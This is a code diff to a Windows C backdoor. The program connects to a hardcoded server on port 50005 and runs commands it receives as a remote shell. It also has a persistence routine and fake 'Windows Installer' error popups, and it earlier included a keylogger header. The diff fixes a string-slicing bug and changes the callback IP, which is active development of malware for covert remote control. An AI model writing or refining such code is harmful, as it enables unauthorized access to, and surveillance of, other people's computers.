@@ -9,7 +9,6 @@
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/types.h>
-#include "keylogger.h"
 
 #define bzero(p, size) (void) memset((p), 0, (size))
 
@@ -106,7 +105,7 @@ void Shell() {
 			bootRun();
 		}
 		else if (strncmp("alert", buffer, 5) == 0){
-            MessageBox(NULL, TEXT(buffer[5:]), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
+            MessageBox(NULL, TEXT(str_cut(buffer,5,1024)), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
         }
 		else {
 			FILE *fp;
@@ -135,7 +134,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	char *ServIP;
 	WSADATA wsaData;
 
-	ServIP = "192.168.1.6";
+	ServIP = "192.168.1.106";
 	ServPort = 50005;
 
 	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
